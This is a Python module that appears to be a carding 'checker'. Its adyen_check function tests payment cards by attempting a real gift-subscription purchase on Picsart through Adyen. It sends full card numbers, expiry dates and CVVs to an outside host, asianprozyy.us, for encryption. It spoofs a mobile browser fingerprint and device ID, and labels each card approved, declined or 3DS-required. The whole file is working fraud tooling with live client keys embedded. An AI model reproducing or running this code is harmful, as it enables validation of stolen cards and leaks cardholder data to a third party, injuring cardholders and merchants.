import time
import random
import re
import requests
from utils.helpers import random_hex

async def adyen_check(card, month, year, cvv):
    try:
        session = requests.Session()
        # 1. Analytics
        analytics_resp = session.post('https://checkoutanalytics-live.adyen.com/checkoutanalytics/v3/analytics?clientKey=live_AWRY4KLIVNGCRDVAOUBDDX4OU4UE4VPH',
                                      json={"version": "6.12.0","channel":"Web","platform":"Web","buildType":"esm","locale":"en-US","referrer":"https://picsart.com/pricing/special-offer/gift","screenWidth":1920,"containerWidth":0,"component":"scheme","flavor":"components","level":"all"},
                                      headers={'Content-Type':'application/json'})
        if analytics_resp.status_code != 200:
            return ("❌ ERROR", "Analytics failed", None)
        try:
            checkout_id = analytics_resp.json().get('checkoutAttemptId')
        except:
            checkout_id = None
        if not checkout_id:
            checkout_id = f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}ED14829E1BC0646EA2213FD1802177333785AB3E55621930DD6796067D7B7034"
        # 2. Access token
        token_resp = session.get('https://picsart.com/pricing/special-offer/gift',
                                 headers={'accept':'*/*','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/145.0.0.0 Safari/537.36'})
        token = None
        if token_resp.status_code == 200:
            match = re.search(r'"access_token":"([^"]+)"', token_resp.text)
            if match:
                token = match.group(1)
        if not token:
            return ("❌ ERROR", "No access token", None)
        # 3. Encrypt
        enc_resp = session.post('https://asianprozyy.us/encrypt/adyenv2',
                                json={"card":f"{card}|{month}|{year}|{cvv}",
                                      "adyenKey":"10001|C6EF5A6E98A3FFE920C6347D16B8203F4A478CFA672D4CC76F3D0976AB81F51BFDCEB81155A05B677D7892F567BDBA9149009787838F9E7F619105717CB3A068FA636B9AF967876B978B0E55E53E86E58F4F62AA822FE79B0211B6A6007D461D7E13DFFD191EAD8AC6C1C877BB11A34544FE42B4FE021793C29620B896CBDC6C0680D0C6C9E59AC6239EDF5BE28DEB27DA9F535C3E6FFE1C2B4EFED06309F396AC3E532B3395A43B510293AEFF7D8EF9DEB36C98FF35C351DD5704BA14FE1BAC7A21FBB493F7CEA5CEBAB1BFE15CAF2BFBE9840353EE628B8915F8B3847AB8AE1761A15D506844E37C7104E466DE17D51625806692EC8C25072280D715319059",
                                      "version":"5.5.1","origin":"https://picsart.com","originKey":"live_AWRY4KLIVNGCRDVAOUBDDX4OU4UE4VPH"})
        if enc_resp.status_code != 200:
            return ("❌ ERROR", "Encryption failed", None)
        enc_json = enc_resp.json()
        encrypted_card = enc_json.get('encryptedCardNumber')
        encrypted_month = enc_json.get('encryptedExpiryMonth')
        encrypted_year = enc_json.get('encryptedExpiryYear')
        encrypted_cvv = enc_json.get('encryptedSecurityCode')
        risk_data = enc_json.get('riskData')
        if not encrypted_card:
            return ("❌ ERROR", "Encryption failed", None)
        brand = "visa" if card.startswith('4') else "mc"
        # 4. Payment
        payload = {
            "items": [{"id":"gift_pro_yearly"}],
            "adyenData": {
                "riskData":{"clientData":risk_data},
                "paymentMethod":{
                    "type":"scheme","holderName":"",
                    "encryptedCardNumber":encrypted_card,
                    "encryptedExpiryMonth":encrypted_month,
                    "encryptedExpiryYear":encrypted_year,
                    "encryptedSecurityCode":encrypted_cvv,
                    "brand":brand,
                    "checkoutAttemptId":checkout_id,
                    "sdkData":"eyJzY2hlbWFWZXJzaW9uIjoxLCJjcmVhdGVkQXQiOjE3ODIwMjIxMDYyOTgsImNoYW5uZWwiOiJ3ZWIiLCJwbGF0Zm9ybSI6IndlYiIsInNka1ZlcnNpb24iOiI2LjM1LjAiLCJwYXltZW50TWV0aG9kQmVoYXZpb3IiOiJuYXRpdmVDb21wb25lbnQiLCJhbmFseXRpY3MiOnsiY2hlY2tvdXRBdHRlbXB0SWQiOiJkMzI5MDQ0MC1lM2U1LTRiYjAtYmQzZC1iZWFjYWE3OTZjNmIxNzgyMDIzNTY4ODM4RUQxNDgyOUUxQkMwNjQ2RUEyMjEzRkQxODAyMTc3MzMzNzg1QUIzRTU1NjIxOTMwREQ2Nzk2MDY3RDdCNzAzNCJ9LCJyaXNrRGF0YSI6eyJjbGllbnREYXRhIjoiZXlKMlpYSnphVzl1SWpvaU1TNHdMakFpTENKa1pYWnBZMlZHYVc1blpYSndjbWx1ZENJNkltSmpNRGN3WkRjME1qRmlOamxsWVdNM01XUmxZbU01TW1ZNU1XTTFORFl3SWl3aWNHVnljMmx6ZEdWdWRFTnZiMnRwWlNJNld5SmZjbkJmZFdsa1BXWXdPVEE0TjJVMExXRTNNV010TjJGak9DMDVPV0U1TFdRMllUVmpOR0ZpWWpNME55SmRMQ0pqYjIxd2IyNWxiblJ6SWpwN0luWmxjbk5wYjI0aU9pSXhMakF1TkNJc0ltWnBibWRsY25CeWFXNTBRMjl0Y0c5dVpXNTBjeUk2ZXlKaGRXUnBieUk2TVRJMExqQTRNRGN5TnpZMk1UQTFNRE16TENKallXNTJZWE1pT25zaWQybHVaR2x1WnlJNmRISjFaU3dpWjJWdmJXVjBjbmtpT2lJMVl6ZGxOamcyTVRZMVpUUTBaREV4TXpJeU5URmxNbVZsWVRsbVpHRm1NQ0lzSW5SbGVIUWlPaUppTWpabU5EYzBaVFppTURFeU1qVmxOREEwTW1KaFlUSTBZalV4WXpobU1TSjlMQ0prWVhSbFZHbHRaVXh2WTJGc1pTSTZJbVZ1TFVkQ0lpd2laR1YyYVdObFRXVnRiM0o1SWpvNExDSm1iMjUwVUhKbFptVnlaVzVqWlhNaU9uc2laR1ZtWVhWc2RDSTZNVFkwTGpjeE9EYzFMQ0poY0hCc1pTSTZNVFkwTGpjeE9EYzFMQ0p6WlhKcFppSTZNVFkwTGpjeE9EYzFMQ0p6WVc1eklqb3hORFV1T1RBMk1qVXNJbTF2Ym04aU9qRXpNaTQyTWpVc0ltMXBiaUk2TVRBdU1qazJPRGMxTENKemVYTjBaVzBpT2pFME5TNDVNRFl5Tlgwc0ltWnZiblJ6SWpwYkluTmhibk10YzJWeWFXWXRkR2hwYmlKZExDSm9ZWEprZDJGeVpVTnZibU4xY25KbGJtTjVJam80TENKcGJtUmxlR1ZrUkVJaU9uUnlkV1VzSW14aGJtZDFZV2RsY3lJNld5SmxiaTFUVXlKZExDSnNiMk5oYkZOMGIzSmhaMlVpT25SeWRXVXNJbTFoZEdnaU9pSTVOV1F4WVdVNVlUZzNaV1JtTVRjNU1qQmtOR1EzWldVMVlXRmxPV1UwTVNJc0luQnNZWFJtYjNKdElqb2lUR2x1ZFhnZ1lYSnRkamd4SWl3aWMyTnlaV1Z1Um5KaGJXVWlPbHN3TERBc01Dd3dYU3dpYzJOeVpXVnVVbVZ6YjJ4MWRHbHZiaUk2V3prNE5TdzBORFJkTENKelpYTnphVzl1VTNSdmNtRm5aU0k2ZEhKMVpTd2lkR2x0WlhwdmJtVWlPaUpCYzJsaEwwTmhiR04xZEhSaElpd2lkWE5sY2tGblpXNTBSR0YwWVNJNmV5SmljbUZ1WkhNaU9sc2lRMmh5YjIxcGRXMGlYU3dpYlc5aWFXeGxJanAwY25WbExDSndiR0YwWm05eWJTSTZJa0Z1WkhKdmFXUWlMQ0poY21Ob2FYUmxZM1IxY21VaU9pSWlMQ0ppYVhSdVpYTnpJam9pSWl3aWJXOWtaV3dpT2lKdGIzUnZJR2MxTnlCd2IzZGxjaUlzSW5Cc1lYUm1iM0p0Vm1WeWMybHZiaUk2SWpFMkxqQXVNQ0o5TENKM1pXSkhiRUpoYzJsamN5STZleUoyWlhKemFXOXVJam9pVjJWaVIwd2dNUzR3SUNoUGNHVnVSMHdnUlZNZ01pNHdJRU5vY205dGFYVnRLU0lzSW5abGJtUnZjaUk2SWxkbFlrdHBkQ0lzSW5abGJtUnZjbFZ1YldGemEyVmtJam9pUjI5dloyeGxJRWx1WXk0Z0tGRjFZV3hqYjIxdEtTSXNJbkpsYm1SbGNtVnlJam9pVjJWaVMybDBJRmRsWWtkTUlpd2ljbVZ1WkdWeVpYSlZibTFoYzJ0bFpDSTZJa0ZPUjB4RklDaFJkV0ZzWTI5dGJTd2dRV1J5Wlc1dklDaFVUU2tnTnpFd0xDQlBjR1Z1UjB3Z1JWTWdNeTR5S1NJc0luTm9ZV1JwYm1kTVlXNW5kV0ZuWlZabGNuTnBiMjRpT2lKWFpXSkhUQ0JIVEZOTUlFVlRJREV1TUNBb1QzQmxia2RNSUVWVElFZE1VMHdnUlZNZ01TNHdJRU5vY205dGFYVnRLU0o5TENKM1pXSkhiRVY0ZEdWdWMybHZibk1pT25zaVkyOXVkR1Y0ZEVGMGRISnBZblYwWlhNaU9uc2lZV3h3YUdFaU9pSjBjblZsSWl3aVlXNTBhV0ZzYVdGeklqb2lkSEoxWlNJc0ltUmxjSFJvSWpvaWRISjFaU0lzSW1SbGMzbHVZMmh5YjI1cGVtVmtJam9pWm1Gc2MyVWlMQ0ptWVdsc1NXWk5ZV3B2Y2xCbGNtWnZjbTFoYm1ObFEyRjJaV0YwSWpvaVptRnNjMlVpTENKd2IzZGxjbEJ5WldabGNtVnVZMlVpT2lKc2IzY3RjRzkzWlhJaUxDSndjbVZ0ZFd4MGFYQnNhV1ZrUVd4d2FHRWlPaUowY25WbElpd2ljSEpsYzJWeWRtVkVjbUYzYVc1blFuVm1abVZ5SWpvaVptRnNjMlVpTENKemRHVnVZMmxzSWpvaVptRnNjMlVpTENKNGNrTnZiWEJoZEdsaWJHVWlPaUptWVd4elpTSjlMQ0p3WVhKaGJXVjBaWEp6SWpvaVpEVTVPR0V3TkRkbU5tSmhaRGd6TTJJMk5tUTVaVEE1TlRoaU16SXpZV0VpTENKemFHRmtaWEpRY21WamFYTnBiMjV6SWpvaU9EaGtaVEpsWkRWbU5USmpOekEyTm1OaFlqaGlOakpoTnpRM1pUaG1NVGtpTENKbGVIUmxibk5wYjI1eklqcGJJa0ZPUjB4RlgybHVjM1JoYm1ObFpGOWhjbkpoZVhNaUxDSkZXRlJmWW14bGJtUmZiV2x1YldGNElpd2lSVmhVWDJOdmJHOXlYMkoxWm1abGNsOW9ZV3htWDJac2IyRjBJaXdpUlZoVVgyUnBjMnB2YVc1MFgzUnBiV1Z5WDNGMVpYSjVJaXdpUlZoVVgyWnNiMkYwWDJKc1pXNWtJaXdpUlZoVVgzUmxlSFIxY21WZlkyOXRjSEpsYzNOcGIyNWZZbkIwWXlJc0lrVllWRjkwWlhoMGRYSmxYMk52YlhCeVpYTnphVzl1WDNKbmRHTWlMQ0pGV0ZSZmRHVjRkSFZ5WlY5bWFXeDBaWEpmWVc1cGMzOTBjbTl3YVdNaUxDSkZXRlJmYzFKSFFpSXNJa3RJVWw5d1lYSmhiR3hsYkY5emFHRmtaWEpmWTI5dGNHbHNaU0lzSWs5RlUxOWxiR1Z0Wlc1MFgybHVaR1Y0WDNWcGJuUWlMQ0pQUlZOZlptSnZYM0psYm1SbGNsOXRhWEJ0WVhBaUxDSlBSVk5mYzNSaGJtUmhjbVJmWkdWeWFYWmhkR2wyWlhNaUxDSlBSVk5mZEdWNGRIVnlaVjltYkc5aGRDSXNJazlGVTE5MFpYaDBkWEpsWDJac2IyRjBYMnhwYm1WaGNpSXNJazlGVTE5MFpYaDBkWEpsWDJoaGJHWmZabXh2WVhRaUxDSlBSVk5mZEdWNGRIVnlaVjlvWVd4bVgyWnNiMkYwWDJ4cGJtVmhjaUlzSWs5RlUxOTJaWEowWlhoZllYSnlZWGxmYjJKcVpXTjBJaXdpVjBWQ1IweGZZMjlzYjNKZlluVm1abVZ5WDJac2IyRjBJaXdpVjBWQ1IweGZZMjl0Y0hKbGMzTmxaRjkwWlhoMGRYSmxYMkZ6ZEdNaUxDSlhSVUpIVEY5amIyMXdjbVZ6YzJWa1gzUmxlSFIxY21WZlpYUmpJaXdpVjBWQ1IweGZZMjl0Y0hKbGMzTmxaRjkwWlhoMGRYSmxYMlYwWXpFaUxDSlhSVUpIVEY5amIyMXdjbVZ6YzJWa1gzUmxlSFIxY21WZmN6TjBZeUlzSWxkRlFrZE1YMk52YlhCeVpYTnpaV1JmZEdWNGRIVnlaVjl6TTNSalgzTnlaMklpTENKWFJVSkhURjlrWldKMVoxOXlaVzVrWlhKbGNsOXBibVp2SWl3aVYwVkNSMHhmWkdWaWRXZGZjMmhoWkdWeWN5SXNJbGRGUWtkTVgyUmxjSFJvWDNSbGVIUjFjbVVpTENKWFJVSkhURjlzYjNObFgyTnZiblJsZUhRaUxDSlhSVUpIVEY5dGRXeDBhVjlrY21GM0lsMHNJbVY0ZEdWdWMybHZibEJoY21GdFpYUmxjbk1pT2lKaVlqaGlZVEV4T0RVeU16RTJPR1k0WVRJNU9EVTJOemMxTXpnNE1tWm1NU0o5ZlN3aWRtbHphWFJsWkZCaFoyVnpJanBiWFN3aVltRjBkR1Z5ZVVsdVptOGlPbnNpWW1GMGRHVnllVXhsZG1Wc0lqb3pMQ0ppWVhSMFpYSjVRMmhoY21kcGJtY2lPblJ5ZFdWOUxDSmliM1JFWlhSbFkzUnZjbk1pT25zaWQyVmlSSEpwZG1WeUlqcG1ZV3h6WlN3aVkyOXZhMmxsUlc1aFlteGxaQ0k2ZEhKMVpTd2lhR1ZoWkd4bGMzTkNjbTkzYzJWeUlqcG1ZV3h6WlN3aWJtOU1ZVzVuZFdGblpYTWlPbVpoYkhObExDSnBibU52Ym5OcGMzUmxiblJGZG1Gc0lqcG1ZV3h6WlN3aWFXNWpiMjV6YVhOMFpXNTBVR1Z5YldsemMybHZibk1pT21aaGJITmxMQ0prYjIxTllXNXBjSFZzWVhScGIyNGlPbVpoYkhObExDSmhjSEJXWlhKemFXOXVVM1Z6Y0dsamFXOTFjeUk2Wm1Gc2MyVXNJbVoxYm1OMGFXOXVRbWx1WkZOMWMzQnBZMmx2ZFhNaU9uUnlkV1VzSW1KdmRFbHVWWE5sY2tGblpXNTBJanBtWVd4elpTd2lkMmx1Wkc5M1UybDZaVk4xYzNCcFkybHZkWE1pT21aaGJITmxMQ0ppYjNSSmJsZHBibVJ2ZDBWNGRHVnlibUZzSWpwbVlXeHpaU3dpZDJWaVIwd2lPbVpoYkhObGZYMTkifX0="
                },
                "browserInfo":{"acceptHeader":"*/*","javaEnabled":False,"colorDepth":24,"language":"en-SS","screenHeight":985,"screenWidth":444,"userAgent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36","timeZoneOffset":-330},
                "origin":"https://picsart.com",
                "clientStateDataIndicator":True
            },
            "redirectUrl":"https%3A%2F%2Fpicsart.com%2Fpricing%2Fspecial-offer%2Fgift",
            "analyticsInfo":{"impact_click_id":""}
        }
        pay_headers = {
            'authority':'api.picsart.com','accept':'*/*','accept-language':'en-US,en;q=0.9',
            'content-type':'application/json','deviceid':'a.s.mqndoz2c.7757675f-f50e-440b-81ab-bffd1ce7890a',
            'origin':'https://picsart.com','platform':'website','referer':'https://picsart.com/',
            'sec-ch-ua':'"Chromium";v="139", "Not;A=Brand";v="99"','sec-ch-ua-mobile':'?1',
            'sec-ch-ua-platform':'"Android"',
            'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-app-authorization':f'Bearer {token}'
        }
        pay_resp = session.post('https://api.picsart.com/shop/subscription/adyen/purchase', headers=pay_headers, json=payload, timeout=30)
        if pay_resp.status_code != 200:
            return ("❌ ERROR", f"Payment error: {pay_resp.status_code}", None)
        resp_text = pay_resp.text
        if 'resultCode":"Authorised"' in resp_text:
            return ("✅ APPROVED", "Payment Authorised", True)
        elif 'resultCode":"Refused"' in resp_text:
            return ("❌ DECLINED", "Refused", False)
        elif 'action' in resp_text and '3ds' in resp_text.lower():
            return ("🔒 3DS", "3DS Required", None)
        else:
            return ("⚠️ UNKNOWN", resp_text[:100], None)
    except Exception as e:
        return ("❌ ERROR", str(e)[:100], None)